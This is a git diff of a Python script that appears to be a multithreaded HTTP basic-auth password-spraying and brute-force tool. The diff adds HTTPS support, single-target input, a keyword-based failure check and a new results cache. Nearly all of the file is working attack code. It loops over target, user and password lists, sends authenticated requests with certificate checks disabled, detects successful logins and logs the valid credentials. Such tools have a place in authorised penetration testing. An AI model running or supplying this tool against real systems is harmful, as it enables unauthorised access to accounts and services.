@@ -3,7 +3,8 @@ import ZHOR_Modules.nicePrints as np
 import ZHOR_Modules.listUtils as lu
 import ZHOR_Modules.osUtils as osu
 import ZHOR_Modules.logUtils as logu
-from ZHOR_Modules.csvUtils import getTimeStamp
+import ZHOR_Modules.timestampsUtils as tsu
+import ZHOR_Modules.SPTT as SPTT
 
 import sqlite3
 import requests
@@ -14,6 +15,7 @@ from datetime import timedelta
 import argparse
 import sys
 import threading
+import os
 import time
 
 
@@ -25,7 +27,7 @@ REQUIRED_ARGUMENTS = parser.add_argument_group("Required arguments")
 OPTIONAL_ARGUMENTS = parser.add_argument_group("Optional arguments")
 
 # Required arguments
-REQUIRED_ARGUMENTS.add_argument('-t',metavar='"TARGET LIST"',type=str,required=True,help='Target IP or fqdn list file')
+REQUIRED_ARGUMENTS.add_argument('-t',metavar='"TARGET(s)"',type=str,required=True,help='Target IP/fqdn. Can either be a single target or a file')
 REQUIRED_ARGUMENTS.add_argument('-u',metavar='"USERS"',type=str,required=True,help='Users list file')
 REQUIRED_ARGUMENTS.add_argument('-p',metavar='"PASSWORDS"',type=str,required=True,help='Passwords list file')
 REQUIRED_ARGUMENTS.add_argument('-s',metavar='"SLEEP"',type=int,required=True,help='Sleep time between each request (in milliseconds)')
@@ -34,8 +36,8 @@ REQUIRED_ARGUMENTS.add_argument('-m',metavar='"MODE"',type=int,required=True,hel
 
 # Optional arguments
 OPTIONAL_ARGUMENTS.add_argument('-q',action="store_true",help='"Quiet" mode: Skip the initial recap and the "press enter to continue" message')
-OPTIONAL_ARGUMENTS.add_argument('-d',metavar="DB",type=str,required=False,help='Cache database path (if different from default)')
 OPTIONAL_ARGUMENTS.add_argument('--timeout',type=int,required=False,help='Connection attempt timeout (in milliseconds). By default is 1000ms')
+OPTIONAL_ARGUMENTS.add_argument('--https',action="store_true",help="Use https instead of http")
 OPTIONAL_ARGUMENTS.add_argument('--no-cache',action="store_true",help="Ignore cached results")
 OPTIONAL_ARGUMENTS.add_argument('--debug',action="store_true",help="Debug mode")
 
@@ -52,142 +54,53 @@ PROXYES = None
 LOG_LOCK    = threading.Lock()
 STDOUT_LOCK = threading.Lock()
 DB_LOCK     = threading.Lock()
-LOG_PATH = f"basic_auth_bf_log_{getTimeStamp()}.log"
+LOG_PATH = f"logs/basic_auth_bf_log_{tsu.getTimeStamp_iso8601()}.log"
 CACHE_DB = "basic-auth-spray-cache.db"
+HTTPS = False
 SKIP_CACHE = False
 CONNECTION_TIMEOUT = None
+UNAUTHORIZED_WORDS = fm.fileToSimpleList('unauthorized.txt')
+
+TupleCacher = SPTT.TupleCacher('cache/basic-auth-spray-cache.db',columnNames=['target','username','password'],columnTypes=['TEXT','TEXT','BLOB'])
 
 
-def dbCheck():
-    DB_LOCK.acquire()
-    
-    # Connect to the SQLite database (it will create the database if it does not exist)
-    conn = sqlite3.connect(CACHE_DB)
-    cursor = conn.cursor()
+# return 0 if it was unsuccessful
+# return 1 otherwise
+def determineResult(responseObject):
 
-    # Create the table if it does not exist
-    cursor.execute('''
-    CREATE TABLE IF NOT EXISTS cached_results (
-        target TEXT,
-        user TEXT,
-        password TEXT,
-        result TEXT
-    )
-    ''')
-
-    # Commit the transaction and close the connection
-    conn.commit()
-    conn.close()
-
-    DB_LOCK.release()
-
-def writeCache(target, user, password, result):
-    global DB_LOCK
-
-    DB_LOCK.acquire()
-    
-    # Connect to the SQLite database (it will create the database if it does not exist)
-    conn = sqlite3.connect(CACHE_DB)
-    cursor = conn.cursor()
-
-    # Insert the values into the table
-    cursor.execute('''
-    INSERT INTO cached_results (target, user, password, result)
-    VALUES (?, ?, ?, ?)
-    ''', (target, user, password, result))
-
-    # Commit the transaction and close the connection
-    conn.commit()
-    conn.close()
-
-    DB_LOCK.release()
-
-def readCache(target, user, password):
-    # Connect to the SQLite database
-    conn = sqlite3.connect(CACHE_DB)
-    cursor = conn.cursor()
-
-    # Query the table for the specified values
-    cursor.execute('''
-    SELECT * FROM cached_results
-    WHERE target = ? AND user = ? AND password = ?
-    ''', (target, user, password))
-
-    # Fetch the result
-    result = cursor.fetchall()
-    #print(result)
-    #input()
-
-    # If result is None, it means the values do not exist in the database
-    conn.close()
-    
-    if len(result) == 0:
-        return False
-    
-    return True
-
-# return false ---> not a KO
-# return a string ---> reason of KO
-def isKo(responseObject):
-
-    koKeywords = ['unauthorized'] # add more as they are found
-
+    # fail due to 401
     if (responseObject.status_code == 401):
-        return "Reason: status 401"
+        return 0
     
-    for word in koKeywords:
+    # fail due to a keyword suggesting failure
+    for word in UNAUTHORIZED_WORDS:
         if word in responseObject.text.lower():
-            return f"Reason: keyword '{word}' in response text"
+            return 0
         
 
-    # not actually a ko
-    return False
+    # success
+    return 1
 
 def attemptConnection(target: str, username: str, password: str):
     result = None
 
-    if not SKIP_CACHE:
-        cacheResult = readCache(target,username,password)
-        if cacheResult is True:
-
-            msg = "[CACHED] Target {} | User: {} | Password: {}".format(target,username,password)
-            logu.logDebug(msg,fileName=LOG_PATH,lock=LOG_LOCK)
-            
-            # let the thread wrapper know it was a cached request, do not sleep
-            return 1 
-
-    #    writeCache(target,username,password)
-
     try:
         auth = (username,password)
-        result = requests.get(url="http://" + target,headers=HEADERS,proxies=PROXYES,verify=False,auth=auth,timeout=CONNECTION_TIMEOUT)
+        if HTTPS:
+            prefix = "https://"
+        else:
+            prefix = "http://"
         
-
+        result = requests.get(url= prefix + target,headers=HEADERS,proxies=PROXYES,verify=False,auth=auth,timeout=CONNECTION_TIMEOUT)
+        
     except Exception as e:
-        msg_stdout = "[EXCEPTION] Target {} | User: {} | Password: {} | check log for details".format(target,username,password)
-        msg_log = "[EXCEPTION] Target {} | User: {} | Password: {} | {}".format(target,username,password,str(e))
-        np.errorPrint(msg_stdout,lock=STDOUT_LOCK)        
-        logu.logError(msg_log,fileName=LOG_PATH, lock=LOG_LOCK,stdout=False)
-        writeCache(target,username,password,'EXCEPTION')   
-        return
+        msg = "[EXCEPTION] Target {} | User: {} | Password: {} | {}".format(prefix + target,username,password,str(e))        
+        logu.logError(msg,fileName=LOG_PATH, lock=LOG_LOCK,stdout=True)
+        return -1
 
+    return determineResult(result)
 
     
-
-    ko = isKo(result)
-
-    # auth succeded
-    if ko is False:        
-        msg = "[SUCCESS] Target {} | User: {} | Password: {}".format(target,username,password)
-        logu.logInfo(msg,fileName=LOG_PATH,lock=LOG_LOCK)
-        writeCache(target,username,password,'SUCCESS')
-        return
-
-    # auth failed
-    msg = "[FAILED] Target {} | User: {} | Password: {} | {}".format(target,username,password,ko)
-    logu.logDebug(msg,fileName=LOG_PATH,lock=LOG_LOCK)
-    writeCache(target,username,password,'FAILED')
-    return
 
 
 # function used by the threads
@@ -196,15 +109,30 @@ def threadWrapperFunction(threadID: int,triplets: list,sleepTime: int):
     # [target,user,password]
 
     for triplet in triplets:
-        msg = "[Thread #{}] Testing {} {} {}".format(str(threadID),triplet[0],triplet[1],triplet[2])
-        np.debugPrint(msg,lock=STDOUT_LOCK)
 
+        if TupleCacher.tupleExists((triplet[0],triplet[1],triplet[2])):
 
-        res = attemptConnection(triplet[0],triplet[1],triplet[2])
-
-        if res == 1: # was it a cached request? (assuming SKIP_CACHE is false)
-            pass
+            msg = "[Thread #{}] [CACHED] Target {} | User: {} | Password: {}".format(str(threadID),triplet[0],triplet[1],triplet[2])
+            np.debugPrint(msg,lock=STDOUT_LOCK)
+        
         else:
+            msg = "[Thread #{}] [testing] Target {} | User: {} | Password: {}".format(str(threadID),triplet[0],triplet[1],triplet[2])
+            np.debugPrint(msg,lock=STDOUT_LOCK)
+
+            res = attemptConnection(triplet[0],triplet[1],triplet[2])
+
+            # auth succeded
+            if res == 1:        
+                msg = "[SUCCESS] Target {} | User: {} | Password: {}".format(triplet[0],triplet[1],triplet[2])
+                logu.logInfo(msg,fileName=LOG_PATH,lock=LOG_LOCK)
+                TupleCacher.insertSuccess((triplet[0],triplet[1],triplet[2]))
+
+            # auth failed
+            if res == 0:                
+                msg = "[FAILED] Target {} | User: {} | Password: {}".format(triplet[0],triplet[1],triplet[2])
+                logu.logDebug(msg,fileName=LOG_PATH,lock=LOG_LOCK)
+                TupleCacher.insertFail((triplet[0],triplet[1],triplet[2]))
+
             time.sleep(sleepTime)
 
 
@@ -267,14 +195,25 @@ def recap(tripletMode: int, targets: list, users: list, passwords: list,threadCo
 
 
 if __name__ == '__main__':
-
     
 
     quiet       = '-q' in sys.argv
     SKIP_CACHE  = '--no-cache' in sys.argv
+
+    if SPTT.safeWordlistSize(args.p):
+        pass
+    else:
+        np.warningPrint("The wordlist you selected is very large and may cause the script or machine to crash. Press enter to continue or quit with CTRL+C and select a smaller wordlist.")
+        input()
     
     tripletMode = args.m
-    targets     = fm.fileToSimpleList(args.t)
+    
+    targets = []
+    if os.path.isfile(args.t):
+        targets = fm.fileToSimpleList(args.t)
+    else:
+        targets = [args.t]
+
     users       = fm.fileToSimpleList(args.u)
     passwords   = fm.fileToSimpleList(args.p)
     sleepTime   = 0 
@@ -291,8 +230,6 @@ if __name__ == '__main__':
         else:
             CONNECTION_TIMEOUT = int(args.timeout) / 1000
 
-
-    dbCheck()
 
     # organizing triplets
     triplets = makeTriplets(tripletMode,targets,users,passwords)
@@ -321,5 +258,5 @@ if __name__ == '__main__':
     for thread in threadList:
         thread.join()
 
-
+    TupleCacher.dumpToDB()
     np.infoPrint("Job done. Check log for results")
